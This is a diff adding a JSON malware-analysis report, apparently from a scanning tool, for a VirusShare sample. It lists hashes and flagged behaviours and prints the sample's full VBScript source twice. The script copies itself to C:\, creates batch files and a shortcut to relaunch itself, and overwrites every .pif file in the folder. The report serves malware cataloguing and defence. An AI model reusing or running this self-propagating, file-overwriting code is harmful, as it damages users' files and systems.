@@ -1,0 +1,58 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "command": "May run PowerShell commands",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "Dim shell, msc, batch, fso, batchb\nset fso=CreateObject(\"Scripting.FileSystemObject\")\nfso.CopyFile Wscript.ScriptFullName, \"C:\\command.vbs\", True\nset batch=CreateTextFile(\"C:\\bat.bat\")\nbatch.WriteLine \"cls\"\nbatch.WriteLine \"@echo off\"\nbatch.WriteLine \"cscript C:\\command.vbs\"\nbatch.Close\nset shell=wscript.createobject(\"wscript.shell\")\nset msc=shell.CreateShortCut(\"C:\\pif.lnk\")\nmsc.TargetPath=shell.ExpandEnvironment(\"C:\\bat.bat\")\nmsc.WindowStyle=4\nmsc.Save\nset batchb=CreaateTextFile(\"C:\\pif.bat\")\nbatchb.WriteLine \"cls\"\nbatchb.WriteLine \"@echo off\"\nbatchb.WriteLine \"for %%a in (*.pif) do copy C:\\pif.pif %%a\"\nbatchb.Close\nshell.Run  \"C:\\pif.bat\""
+    },
+    "filename": "VirusShare_32408d9f01e163c950b67ddf9fc901da",
+    "filesize": 669,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "32408d9f01e163c950b67ddf9fc901da",
+        "sha1": "797ea0b3d07c9e5363d734d3eaeb03b8209fd1c9",
+        "sha256": "3ee55760b53c64025742da1adbd93fbf80ba039e20db572778b77aab7f0c768f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim shell, msc, batch, fso, batchb",
+            "set fso=CreateObject(\"Scripting.FileSystemObject\")",
+            "fso.CopyFile Wscript.ScriptFullName, \"C:\\command.vbs\", True",
+            "set batch=CreateTextFile(\"C:\\bat.bat\")",
+            "batch.WriteLine \"cls\"",
+            "batch.WriteLine \"@echo off\"",
+            "batch.WriteLine \"cscript C:\\command.vbs\"",
+            "batch.Close",
+            "set shell=wscript.createobject(\"wscript.shell\")",
+            "set msc=shell.CreateShortCut(\"C:\\pif.lnk\")",
+            "msc.TargetPath=shell.ExpandEnvironment(\"C:\\bat.bat\")",
+            "msc.WindowStyle=4",
+            "msc.Save",
+            "set batchb=CreaateTextFile(\"C:\\pif.bat\")",
+            "batchb.WriteLine \"cls\"",
+            "batchb.WriteLine \"@echo off\"",
+            "batchb.WriteLine \"for %%a in (*.pif) do copy C:\\pif.pif %%a\"",
+            "batchb.Close",
+            "shell.Run  \"C:\\pif.bat\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263180",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
